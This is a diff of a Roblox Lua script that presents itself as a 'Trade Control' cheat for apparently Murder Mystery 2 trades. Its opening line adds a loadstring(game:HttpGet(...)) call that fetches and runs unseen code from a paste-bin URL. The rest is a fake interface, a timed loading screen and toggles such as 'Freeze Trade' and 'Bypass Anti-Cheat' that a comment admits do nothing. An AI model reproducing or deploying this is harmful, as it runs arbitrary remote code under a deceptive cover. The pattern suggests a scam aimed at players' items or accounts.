@@ -1,1 +1,580 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/cattoscripts/MM2FreezeTrade/refs/heads/main/RbOfficial/lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/94IRs3nfdq/0"))()
+--// CATTO SCRIPTS | TRADE CONTROL V2.1
+--// Modern Dark Neon UI
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local COLORS = {
+    Background = Color3.fromRGB(10, 13, 22),
+    Panel = Color3.fromRGB(17, 22, 35),
+    Card = Color3.fromRGB(22, 29, 44),
+    Accent = Color3.fromRGB(112, 92, 255),
+    Cyan = Color3.fromRGB(52, 211, 235),
+    Text = Color3.fromRGB(241, 244, 255),
+    Muted = Color3.fromRGB(139, 151, 175),
+    Green = Color3.fromRGB(82, 230, 170),
+}
+
+-- REMOVE PREVIOUS UI
+
+local old = playerGui:FindFirstChild("TradeControlUI")
+if old then old:Destroy() end
+
+local function create(className, properties, parent)
+    local obj = Instance.new(className)
+    for key, value in pairs(properties) do
+        obj[key] = value
+    end
+    obj.Parent = parent
+    return obj
+end
+
+local function corner(parent, radius)
+    return create("UICorner", {
+        CornerRadius = UDim.new(0, radius)
+    }, parent)
+end
+
+local function stroke(parent, color, thickness, transparency)
+    return create("UIStroke", {
+        Color = color,
+        Thickness = thickness or 1,
+        Transparency = transparency or 0
+    }, parent)
+end
+
+local function tween(object, duration, properties)
+    local animation = TweenService:Create(
+        object,
+        TweenInfo.new(duration, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        properties
+    )
+    animation:Play()
+    return animation
+end
+
+-- SCREEN GUI
+
+local gui = create("ScreenGui", {
+    Name = "TradeControlUI",
+    ResetOnSpawn = false,
+    IgnoreGuiInset = true,
+    DisplayOrder = 50,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+}, playerGui)
+
+-- LOADING SCREEN
+
+local loading = create("Frame", {
+    Name = "Loading",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.fromScale(0.5, 0.5),
+    Size = UDim2.fromOffset(330, 175),
+    BackgroundColor3 = COLORS.Background,
+    BorderSizePixel = 0
+}, gui)
+
+corner(loading, 18)
+stroke(loading, COLORS.Accent, 1.5, 0.15)
+
+create("UIGradient", {
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, COLORS.Panel),
+        ColorSequenceKeypoint.new(1, COLORS.Background)
+    }),
+    Rotation = 135
+}, loading)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 20, 0, 20),
+    Size = UDim2.new(1, -40, 0, 30),
+    BackgroundTransparency = 1,
+    Text = "CATTO / TRADE CONTROL",
+    TextColor3 = COLORS.Text,
+    TextSize = 18,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, loading)
+
+local loadingMessage = create("TextLabel", {
+    Position = UDim2.new(0, 20, 0, 57),
+    Size = UDim2.new(1, -40, 0, 25),
+    BackgroundTransparency = 1,
+    Text = "Preparing interface...",
+    TextColor3 = COLORS.Muted,
+    TextSize = 13,
+    Font = Enum.Font.Gotham,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, loading)
+
+local loadingCount = create("TextLabel", {
+    Position = UDim2.new(1, -65, 0, 57),
+    Size = UDim2.new(0, 45, 0, 25),
+    BackgroundTransparency = 1,
+    Text = "10s",
+    TextColor3 = COLORS.Cyan,
+    TextSize = 14,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Right
+}, loading)
+
+local track = create("Frame", {
+    Position = UDim2.new(0, 20, 0, 100),
+    Size = UDim2.new(1, -40, 0, 6),
+    BackgroundColor3 = COLORS.Card,
+    BorderSizePixel = 0
+}, loading)
+corner(track, 6)
+
+local bar = create("Frame", {
+    Size = UDim2.new(0, 0, 1, 0),
+    BackgroundColor3 = COLORS.Accent,
+    BorderSizePixel = 0
+}, track)
+corner(bar, 6)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 20, 0, 122),
+    Size = UDim2.new(1, -40, 0, 22),
+    BackgroundTransparency = 1,
+    Text = "@cattoscripts",
+    TextColor3 = COLORS.Muted,
+    TextSize = 12,
+    Font = Enum.Font.GothamMedium,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, loading)
+
+local messages = {
+    "Initializing components...",
+    "Building interface...",
+    "Loading controls...",
+    "Applying visual effects...",
+    "Almost ready..."
+}
+
+for i = 10, 1, -1 do
+    if not gui.Parent then return end
+
+    loadingCount.Text = i .. "s"
+    loadingMessage.Text = messages[((10 - i) % #messages) + 1]
+
+    tween(bar, 0.85, {
+        Size = UDim2.new((11 - i) / 10, 0, 1, 0)
+    })
+
+    task.wait(1)
+end
+
+loadingMessage.Text = "Interface ready!"
+tween(bar, 0.2, {Size = UDim2.new(1, 0, 1, 0)})
+task.wait(0.3)
+
+tween(loading, 0.3, {
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0.5, 0, 0.47, 0)
+})
+
+for _, obj in ipairs(loading:GetDescendants()) do
+    if obj:IsA("TextLabel") then
+        tween(obj, 0.2, {TextTransparency = 1})
+    elseif obj:IsA("Frame") then
+        tween(obj, 0.2, {BackgroundTransparency = 1})
+    elseif obj:IsA("UIStroke") then
+        tween(obj, 0.2, {Transparency = 1})
+    end
+end
+
+task.wait(0.35)
+loading:Destroy()
+
+-- MAIN WINDOW
+
+local main = create("Frame", {
+    Name = "Main",
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Position = UDim2.fromScale(0.5, 0.5),
+    Size = UDim2.fromOffset(370, 435),
+    BackgroundColor3 = COLORS.Background,
+    BorderSizePixel = 0,
+    ClipsDescendants = true
+}, gui)
+
+corner(main, 17)
+stroke(main, COLORS.Accent, 1.5, 0.2)
+
+create("UIGradient", {
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(19, 24, 40)),
+        ColorSequenceKeypoint.new(1, COLORS.Background)
+    }),
+    Rotation = 120
+}, main)
+
+-- TOP WATERMARK
+
+create("TextLabel", {
+    Name = "CreatorWatermark",
+    Position = UDim2.new(0, 0, 0, 2),
+    Size = UDim2.new(1, 0, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "@Cattoscripts | IG & TikTok",
+    TextColor3 = COLORS.Green,
+    TextTransparency = 0.15,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    ZIndex = 5
+}, main)
+
+-- HEADER
+
+local header = create("Frame", {
+    Name = "Header",
+    Position = UDim2.new(0, 0, 0, 20),
+    Size = UDim2.new(1, 0, 0, 76),
+    BackgroundColor3 = COLORS.Panel,
+    BorderSizePixel = 0
+}, main)
+
+corner(header, 17)
+
+create("Frame", {
+    Position = UDim2.new(0, 0, 1, -16),
+    Size = UDim2.new(1, 0, 0, 16),
+    BackgroundColor3 = COLORS.Panel,
+    BorderSizePixel = 0
+}, header)
+
+local logo = create("Frame", {
+    Position = UDim2.new(0, 16, 0, 16),
+    Size = UDim2.fromOffset(42, 42),
+    BackgroundColor3 = COLORS.Accent,
+    BorderSizePixel = 0
+}, header)
+corner(logo, 12)
+
+create("UIGradient", {
+    Color = ColorSequence.new(COLORS.Accent, COLORS.Cyan),
+    Rotation = 45
+}, logo)
+
+create("TextLabel", {
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    Text = "C",
+    TextColor3 = Color3.new(1, 1, 1),
+    TextSize = 25,
+    Font = Enum.Font.GothamBlack
+}, logo)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 68, 0, 13),
+    Size = UDim2.new(1, -125, 0, 27),
+    BackgroundTransparency = 1,
+    Text = "Trade Control",
+    TextColor3 = COLORS.Text,
+    TextSize = 19,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, header)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 69, 0, 40),
+    Size = UDim2.new(1, -130, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "@cattoscripts",
+    TextColor3 = COLORS.Cyan,
+    TextSize = 11,
+    Font = Enum.Font.GothamMedium,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, header)
+
+local minimize = create("TextButton", {
+    Name = "Minimize",
+    Position = UDim2.new(1, -49, 0, 18),
+    Size = UDim2.fromOffset(33, 33),
+    BackgroundColor3 = COLORS.Card,
+    Text = "−",
+    TextColor3 = COLORS.Text,
+    TextSize = 22,
+    Font = Enum.Font.GothamMedium,
+    AutoButtonColor = false
+}, header)
+corner(minimize, 10)
+
+minimize.MouseEnter:Connect(function()
+    tween(minimize, 0.15, {BackgroundColor3 = COLORS.Accent})
+end)
+
+minimize.MouseLeave:Connect(function()
+    tween(minimize, 0.15, {BackgroundColor3 = COLORS.Card})
+end)
+
+create("Frame", {
+    Position = UDim2.new(0, 16, 1, -1),
+    Size = UDim2.new(1, -32, 0, 1),
+    BackgroundColor3 = COLORS.Accent,
+    BackgroundTransparency = 0.55,
+    BorderSizePixel = 0
+}, header)
+
+-- CONTENT
+
+local content = create("Frame", {
+    Name = "Content",
+    Position = UDim2.new(0, 0, 0, 96),
+    Size = UDim2.new(1, 0, 1, -96),
+    BackgroundTransparency = 1
+}, main)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 18, 0, 12),
+    Size = UDim2.new(1, -36, 0, 22),
+    BackgroundTransparency = 1,
+    Text = "CONTROL PANEL",
+    TextColor3 = COLORS.Muted,
+    TextSize = 11,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, content)
+
+create("TextLabel", {
+    Position = UDim2.new(1, -95, 0, 12),
+    Size = UDim2.new(0, 77, 0, 22),
+    BackgroundTransparency = 1,
+    Text = "● READY",
+    TextColor3 = COLORS.Green,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Right
+}, content)
+
+-- TOGGLE ROWS
+-- These switches only change their own appearance.
+
+local toggleStates = {}
+
+local function createToggle(name, iconText, y)
+    local row = create("Frame", {
+        Name = name:gsub("%s+", "") .. "Row",
+        Position = UDim2.new(0, 14, 0, y),
+        Size = UDim2.new(1, -28, 0, 61),
+        BackgroundColor3 = COLORS.Card,
+        BorderSizePixel = 0
+    }, content)
+
+    corner(row, 12)
+    stroke(row, COLORS.Accent, 1, 0.78)
+
+    local iconBox = create("Frame", {
+        Position = UDim2.new(0, 10, 0.5, -18),
+        Size = UDim2.fromOffset(36, 36),
+        BackgroundColor3 = Color3.fromRGB(37, 35, 73),
+        BorderSizePixel = 0
+    }, row)
+    corner(iconBox, 10)
+
+    create("TextLabel", {
+        Size = UDim2.fromScale(1, 1),
+        BackgroundTransparency = 1,
+        Text = iconText,
+        TextColor3 = COLORS.Cyan,
+        TextSize = 19,
+        Font = Enum.Font.GothamBold
+    }, iconBox)
+
+    create("TextLabel", {
+        Position = UDim2.new(0, 56, 0, 0),
+        Size = UDim2.new(1, -145, 1, 0),
+        BackgroundTransparency = 1,
+        Text = name,
+        TextColor3 = COLORS.Text,
+        TextSize = 13,
+        Font = Enum.Font.GothamSemibold,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        TextTruncate = Enum.TextTruncate.AtEnd
+    }, row)
+
+    local button = create("TextButton", {
+        Position = UDim2.new(1, -65, 0.5, -13),
+        Size = UDim2.fromOffset(51, 26),
+        BackgroundColor3 = Color3.fromRGB(49, 57, 75),
+        Text = "",
+        AutoButtonColor = false
+    }, row)
+    corner(button, 20)
+
+    local knob = create("Frame", {
+        Position = UDim2.new(0, 3, 0.5, -10),
+        Size = UDim2.fromOffset(20, 20),
+        BackgroundColor3 = Color3.fromRGB(226, 231, 242),
+        BorderSizePixel = 0
+    }, button)
+    corner(knob, 20)
+
+    local enabled = false
+    toggleStates[name] = false
+
+    button.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        toggleStates[name] = enabled
+
+        tween(button, 0.2, {
+            BackgroundColor3 = enabled
+                and COLORS.Green
+                or Color3.fromRGB(49, 57, 75)
+        })
+
+        tween(knob, 0.2, {
+            Position = enabled
+                and UDim2.new(1, -23, 0.5, -10)
+                or UDim2.new(0, 3, 0.5, -10)
+        })
+
+        tween(row, 0.15, {
+            BackgroundColor3 = enabled
+                and Color3.fromRGB(25, 55, 48)
+                or COLORS.Card
+        })
+    end)
+
+    button.MouseEnter:Connect(function()
+        if not enabled then
+            tween(row, 0.15, {
+                BackgroundColor3 = Color3.fromRGB(29, 36, 54)
+            })
+        end
+    end)
+
+    button.MouseLeave:Connect(function()
+        tween(row, 0.15, {
+            BackgroundColor3 = enabled
+                and Color3.fromRGB(25, 55, 48)
+                or COLORS.Card
+        })
+    end)
+
+    return row
+end
+
+createToggle("Freeze Trade", "❄", 43)
+createToggle("Force Accept", "✓", 111)
+createToggle("Bypass Anti-Cheat", "!", 179)
+createToggle("Clear Items", "▦", 247)
+
+-- FOOTER
+
+local footer = create("Frame", {
+    Position = UDim2.new(0, 14, 1, -37),
+    Size = UDim2.new(1, -28, 0, 25),
+    BackgroundTransparency = 1
+}, content)
+
+create("Frame", {
+    Size = UDim2.new(1, 0, 0, 1),
+    BackgroundColor3 = COLORS.Accent,
+    BackgroundTransparency = 0.7,
+    BorderSizePixel = 0
+}, footer)
+
+create("TextLabel", {
+    Position = UDim2.new(0, 0, 0, 5),
+    Size = UDim2.new(0.65, 0, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "MADE BY @cattoscripts",
+    TextColor3 = COLORS.Muted,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, footer)
+
+create("TextLabel", {
+    Position = UDim2.new(0.65, 0, 0, 5),
+    Size = UDim2.new(0.35, 0, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "V2.1",
+    TextColor3 = COLORS.Cyan,
+    TextSize = 10,
+    Font = Enum.Font.GothamBold,
+    TextXAlignment = Enum.TextXAlignment.Right
+}, footer)
+
+-- DRAGGING
+
+local dragging = false
+local dragStart
+local startPosition
+local dragInput
+
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+        dragging = true
+        dragStart = input.Position
+        startPosition = main.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+header.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        local delta = input.Position - dragStart
+
+        main.Position = UDim2.new(
+            startPosition.X.Scale,
+            startPosition.X.Offset + delta.X,
+            startPosition.Y.Scale,
+            startPosition.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- MINIMIZE / RESTORE
+
+local minimized = false
+local normalSize = main.Size
+
+minimize.MouseButton1Click:Connect(function()
+    minimized = not minimized
+
+    if minimized then
+        minimize.Text = "+"
+        content.Visible = false
+
+        tween(main, 0.25, {
+            Size = UDim2.new(0, 370, 0, 96)
+        })
+    else
+        minimize.Text = "−"
+
+        tween(main, 0.25, {
+            Size = normalSize
+        })
+
+        task.delay(0.12, function()
+            if main.Parent and not minimized then
+                content.Visible = true
+            end
+        end)
+    end
+end)
+
+print("[CattoScripts] Trade Control UI loaded.")
